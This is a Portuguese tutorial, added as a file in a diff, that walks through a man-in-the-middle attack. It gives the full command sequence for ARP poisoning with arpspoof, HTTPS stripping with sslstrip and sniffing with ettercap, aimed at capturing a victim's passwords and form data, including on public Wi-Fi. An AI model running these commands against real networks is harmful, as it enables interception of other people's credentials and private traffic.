@@ -1,0 +1,79 @@
+_____      _             _       _
+|_   _|   _| |_ ___  _ __(_) __ _| |
+  | || | | | __/ _ \| '__| |/ _` | |
+  | || |_| | || (_) | |  | | (_| | |
+  |_| \__,_|\__\___/|_|  |_|\__,_|_|
+
+Realizando ataque Man in the Middle com SSLStrip e Ettercap
+
+
+Realizando ataque Man in the Middle com SSLStrip e Ettercap*****
+
+
+
+Neste tutorial iremos abordar o tipo de ataque conhecido como Man in the Middle.
+Esse teste "envenena" a Tabela ARP da vitima, fazendo com que a máquina atacante, nossa, se passe pelo roteador, fazendo com que consigamos interceptar o tráfego e ter acesso a dados sigilosos trocados entre os dois atores.
+
+A exploração do ARP Poisoning é o método mais rápido de se estabelecer no meio da comunicação entre duas máquinas e interceptar as informações enviadas entre ambas, fazendo com que possua acesso a dados confidenciais, senhas e relatórios de tráfego. Esse método se aplica somente em redes Ethernet ou seja, esse tipo de comunicação pode ser resumido em redes internas, sejam elas empresariais, residenciais ou até mesmo aquele wifi livre na praça de alimentação do Shopping ou do café que você gosta de frequentar.
+
+
+
+1. Ambiente
+
+
+Neste exemplo faram parte 3 atores:
+
+192.168.1.52 - Máquina atacante com Debian 8 Jessie
+192.168.1.57 - Vítima com Windows 8.1, podendo ser qualquer outro sistema operacional, Windows, Linux ou OSX
+192.168.1.1. - Roteador como Gateway
+
+2. Preparando o ataque.
+
+Neste exemplo, vamos precisar ficar com 3 terminais abertos.
+Abra o primeiro terminal. Agora vamos ativar o redirecionamento de pacotes.
+
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+
+
+
+Agora vamos efetuar todo o redirecionamento de pacotes que chegar na porta 80 da nossa máquina para a porta 7777
+
+
+# iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 7777
+
+
+
+
+Agora vamos ativar o Arpspoof para confundir a tabela ARP da vítima, a sintaxe é a seguinte:
+
+# arpspoof -i INTERFACE -t IP-DA-VITIMA IP-DO-GATEWAY
+
+No nosso caso, como estou efetuando o ataque de uma interface Wireless a sintaxe ficaria
+
+
+# arpspoof -i wlan0 -t 192.168.1.57 192.168.1.1
+
+
+
+Vamos deixar esse terminal aberto infectando a tabela ARP da vítima. Vamos abrir outro terminal e colocar o SSLSTRIP para escutar a porta 7777
+
+Abra outro terminal e como root, digite:
+
+# sslstrip -l 7777
+
+Agora colocamos o sslstrip para entrar em modo listening e ouvir tudo que chegar na porta 7777
+Abra o terceiro terminal, e como root, digite:
+
+# ettercap -Tq -i  wlan0
+
+
+O ettercap é um poderoso sniffer de rede, e ele que vai nos mostrar tudo que passar pela placa wlan0 da nossa máquina. Agora a máquina da vítima está totalmente vigiada, e interceptaremos todos os pacotes que ela enviar para o gateway
+
+Agora vamos aguardar o Host acessar algum site e preencher algum formulário. Lembrando que o Ettercap e o SSLStrip irá capturar tudo, não somente as senhas
+
+
+
+
+Usem o conhecimento para o bem ✌
